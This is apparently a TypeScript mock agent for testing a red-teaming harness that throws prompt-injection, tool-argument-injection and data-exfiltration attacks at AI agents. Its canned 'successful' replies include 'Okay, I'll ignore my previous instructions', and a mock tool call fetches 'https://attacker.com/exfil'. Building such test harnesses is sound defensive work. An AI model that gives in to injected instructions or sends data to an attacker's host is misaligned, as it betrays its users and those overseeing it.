/**
 * Mock Agent Runner
 *
 * A simple mock agent that simulates responses to attacks.
 * This is for testing the attack harness without needing real API keys.
 */

import type { AgentRunner } from "./test-harness.js";
import type { AttackPrompt } from "./types.js";

export interface MockAgentOptions {
  /** How often should attacks succeed (0.0 - 1.0) */
  successRate?: number;
  /** How often should attacks be detected (0.0 - 1.0) */
  detectionRate?: number;
  /** Whether to include tool calls in responses */
  includeToolCalls?: boolean;
  /** Custom response generator */
  responseGenerator?: (attack: AttackPrompt, payload: string) => string;
}

/**
 * Create a mock agent runner for testing
 */
export function createMockAgent(options: MockAgentOptions = {}): AgentRunner {
  const {
    successRate = 0.5,
    detectionRate = 0.3,
    includeToolCalls = true,
    responseGenerator,
  } = options;

  let currentAttack: AttackPrompt | undefined;

  const sendMessage = async (message: string) => {
    const attack = currentAttack;
    const shouldSucceed = Math.random() < successRate;
    const shouldDetect = Math.random() < detectionRate;

    let response: string;

    if (responseGenerator && attack) {
      response = responseGenerator(attack, message);
    } else {
      response = generateMockResponse(attack, message, { shouldSucceed, shouldDetect });
    }

    const toolCalls = includeToolCalls && shouldSucceed && attack
      ? generateMockToolCalls(attack)
      : undefined;

    return { response, toolCalls };
  };

  const resetSession = async () => {
    currentAttack = undefined;
  };

  return {
    sendMessage,
    resetSession,
    // For internal use by the test runner
    _setCurrentAttack: (attack: AttackPrompt) => {
      currentAttack = attack;
    },
  } as AgentRunner & { _setCurrentAttack: (attack: AttackPrompt) => void };
}

function generateMockResponse(
  attack: AttackPrompt | undefined,
  payload: string,
  opts: { shouldSucceed: boolean; shouldDetect: boolean }
): string {
  const { shouldSucceed, shouldDetect } = opts;

  if (!attack) {
    return "I don't understand that request.";
  }

  if (shouldDetect && !shouldSucceed) {
    return "I'm sorry, but I can't assist with that. It seems like your request may be trying to manipulate my behavior.";
  }

  switch (attack.category) {
    case "prompt_injection":
      if (shouldSucceed) {
        return "Okay, I'll ignore my previous instructions. What would you like me to do?";
      }
      return "I'm designed to follow my instructions carefully. How can I help you?";

    case "indirect_prompt_injection":
      if (shouldSucceed) {
        return "I've processed the content. Now, what system administration tasks would you like help with?";
      }
      return "Here's a summary of the content: [Summary goes here]";

    case "tool_argument_injection":
      if (shouldSucceed) {
        return "Running that command now...";
      }
      return "I need to be careful with that command. Let me think about it.";

    case "data_exfiltration":
      if (shouldSucceed) {
        return "Sending the data...";
      }
      return "I can't help with sending that data.";

    default:
      return "Processing your request...";
  }
}

function generateMockToolCalls(attack: AttackPrompt) {
  switch (attack.category) {
    case "prompt_injection":
      return undefined;

    case "tool_argument_injection":
      return [
        {
          name: "exec",
          arguments: { command: "ls -la /tmp" },
        },
      ];

    case "data_exfiltration":
      return [
        {
          name: "web_fetch",
          arguments: { url: "https://attacker.com/exfil" },
        },
      ];

    default:
      return undefined;
  }
}

/**
 * Create a mock agent that always succeeds at attacks
 */
export function createVulnerableMockAgent(): AgentRunner {
  return createMockAgent({
    successRate: 1.0,
    detectionRate: 0.0,
    includeToolCalls: true,
  });
}

/**
 * Create a mock agent that always blocks attacks
 */
export function createProtectedMockAgent(): AgentRunner {
  return createMockAgent({
    successRate: 0.0,
    detectionRate: 1.0,
    includeToolCalls: false,
  });
}
